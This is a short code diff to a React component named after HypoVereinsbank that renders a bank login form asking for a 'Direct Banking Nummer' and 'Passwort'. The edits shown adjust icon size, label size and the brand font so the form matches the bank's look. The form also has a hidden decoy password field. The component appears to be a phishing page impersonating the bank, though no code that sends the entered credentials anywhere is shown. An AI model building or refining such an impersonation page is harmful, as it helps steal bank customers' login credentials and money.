@@ -79,11 +79,11 @@ const InfoHint = ({
         aria-label="Hinweis anzeigen"
         className="inline-flex items-center justify-center rounded-full"
         style={{
-          width: 16,
-          height: 16,
+          width: 14,
+          height: 14,
           backgroundColor: "#262626",
           color: "#fff",
-          fontSize: 11,
+          fontSize: 10,
           fontWeight: 700,
           fontFamily: "Georgia, serif",
           lineHeight: 1,
@@ -353,7 +353,7 @@ const Hypovereinsbank = () => {
                   <input type="password" name="prevent_autofill_pw" autoComplete="new-password" style={{ display: "none" }} />
 
                   <label className="block mb-4">
-                    <span className="flex items-center gap-1.5 text-[14px] mb-1" style={{ color: DARK }}>
+                    <span className="flex items-center gap-1.5 text-[15px] mb-1" style={{ color: DARK, fontFamily: "'UniCredit', Arial, Helvetica, sans-serif" }}>
                       Direct Banking Nummer
                       <InfoHint
                         open={openHint === "user"}
@@ -374,7 +374,7 @@ const Hypovereinsbank = () => {
                   </label>
 
                   <label className="block mb-5">
-                    <span className="flex items-center gap-1.5 text-[14px] mb-1" style={{ color: DARK }}>
+                    <span className="flex items-center gap-1.5 text-[15px] mb-1" style={{ color: DARK, fontFamily: "'UniCredit', Arial, Helvetica, sans-serif" }}>
                       Passwort
                       <InfoHint
                         open={openHint === "pw"}
